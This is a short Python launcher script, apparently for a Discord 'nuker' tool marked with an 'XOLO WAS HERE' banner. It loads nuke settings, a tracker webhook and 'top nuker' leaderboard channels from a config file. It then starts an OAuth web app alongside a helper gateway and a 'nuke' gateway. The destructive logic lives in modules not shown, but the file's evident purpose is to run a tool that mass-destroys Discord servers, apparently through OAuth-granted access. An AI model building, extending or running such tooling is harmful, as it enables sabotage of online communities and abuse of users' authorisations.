import src, asyncio, json

from src import proxy
from src.oauth import website
from src.oauth import gateaway as gateaway_helper
from src.nuke import gateaway as gateaway_nuke

# ██╗░░██╗░█████╗░██╗░░░░░░█████╗░  ░██╗░░░░░░░██╗░█████╗░░██████╗  ██╗░░██╗███████╗██████╗░███████╗
# ╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗  ░██║░░██╗░░██║██╔══██╗██╔════╝  ██║░░██║██╔════╝██╔══██╗██╔════╝
# ░╚███╔╝░██║░░██║██║░░░░░██║░░██║  ░╚██╗████╗██╔╝███████║╚█████╗░  ███████║█████╗░░██████╔╝█████╗░░
# ░██╔██╗░██║░░██║██║░░░░░██║░░██║  ░░████╔═████║░██╔══██║░╚═══██╗  ██╔══██║██╔══╝░░██╔══██╗██╔══╝░░
# ██╔╝╚██╗╚█████╔╝███████╗╚█████╔╝  ░░╚██╔╝░╚██╔╝░██║░░██║██████╔╝  ██║░░██║███████╗██║░░██║███████╗
# ╚═╝░░╚═╝░╚════╝░╚══════╝░╚════╝░  ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝


async def main():
    data = json.loads(open("config.json", "r").read())
    # proxy.create_proxies(1)
    Main = src.Main(data["guild_id"], data["owner_ids"], data["bot_info"], data["tracker_webhook"], data["premium"], data["nuke_settings"], data["top_nuker_channel_id"], data["top_nuker_guild_channel_webhook"], [None])
    await asyncio.gather(*[
        website.AsyncFastAPIApp(Main).run(),
        gateaway_helper.DiscordGateway(Main).connect(),
        gateaway_nuke.DiscordGateway(Main).connect()
    ])
    

asyncio.run(main())

